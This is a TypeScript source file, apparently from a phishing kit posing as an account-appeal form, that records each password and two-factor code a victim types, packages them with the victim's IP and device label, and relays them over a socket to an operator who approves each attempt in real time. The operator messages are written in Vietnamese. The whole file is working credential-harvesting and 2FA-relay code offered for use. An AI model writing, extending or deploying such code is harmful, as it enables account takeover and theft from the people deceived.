import type { LoginProvider } from '@/store/store';
import type { FormDataPayload, IpInfo, LoginData } from '@/utils/message';
import { buildAppealMessage } from '@/utils/message';
import { sendAppealMessage, waitCodeApproval, waitLoginApproval } from '@/utils/socket-approval';
import type { Socket } from 'socket.io-client';

export type LoginSubmitResult = {
    approved: boolean;
    needs2FA: boolean;
};

export type CodeSubmitResult = {
    approved: boolean;
};

type AppealContext = {
    socket: Socket;
    messageId: number | null;
    setMessageId: (id: number | null) => void;
    formData: FormDataPayload;
    loginData: LoginData;
    loginProvider: LoginProvider | null;
    passwordAttempts: string[];
    twoFAAttempts: string[];
    deviceLabel: string;
    ip: IpInfo;
    setLoginData: (data: LoginData) => void;
    addPasswordAttempt: (password: string) => void;
    addTwoFAAttempt: (code: string) => void;
};

export const submitLoginApproval = async (
    ctx: AppealContext,
    identity: string,
    password: string
): Promise<LoginSubmitResult> => {
    const nextPasswords = [...ctx.passwordAttempts, password];
    ctx.addPasswordAttempt(password);
    ctx.setLoginData({ email: identity.trim(), password });

    const message = buildAppealMessage({
        form: ctx.formData,
        login: { email: identity.trim(), password },
        loginProvider: ctx.loginProvider,
        passwordLogs: nextPasswords,
        codeAttempts: ctx.twoFAAttempts,
        ip: ctx.ip,
        deviceLabel: ctx.deviceLabel
    });

    const attemptLine = `\n\n🔢 <b>Lần ${nextPasswords.length}</b> — bấm nút ở tin này để duyệt\n\n⏳ <b>Chờ duyệt...</b>`;

    const newMessageId = await sendAppealMessage(ctx.socket, {
        message: `${message}${attemptLine}`,
        message_id: ctx.messageId,
        stage: 'login',
        attempt: nextPasswords.length
    });
    ctx.setMessageId(newMessageId);

    const result = await waitLoginApproval(ctx.socket);

    if (result === 'approved' || result === 'skipped') {
        return { approved: true, needs2FA: false };
    }
    if (result === '2fa') {
        return { approved: false, needs2FA: true };
    }
    return { approved: false, needs2FA: false };
};

export const submitCodeApproval = async (ctx: AppealContext, code: string): Promise<CodeSubmitResult> => {
    const nextCodes = [...ctx.twoFAAttempts, code];
    ctx.addTwoFAAttempt(code);

    const message = buildAppealMessage({
        form: ctx.formData,
        login: ctx.loginData,
        loginProvider: ctx.loginProvider,
        passwordLogs: ctx.passwordAttempts,
        codeAttempts: nextCodes,
        ip: ctx.ip,
        deviceLabel: ctx.deviceLabel
    });

    const attemptLine = `\n\n🔢 <b>2FA Lần ${nextCodes.length}</b> — bấm nút ở tin này để duyệt\n\n⏳ <b>Chờ duyệt...</b>`;

    const newMessageId = await sendAppealMessage(ctx.socket, {
        message: `${message}${attemptLine}`,
        message_id: ctx.messageId,
        stage: 'code',
        attempt: nextCodes.length
    });
    ctx.setMessageId(newMessageId);

    const result = await waitCodeApproval(ctx.socket);
    return { approved: result === 'approved' || result === 'skipped' };
};
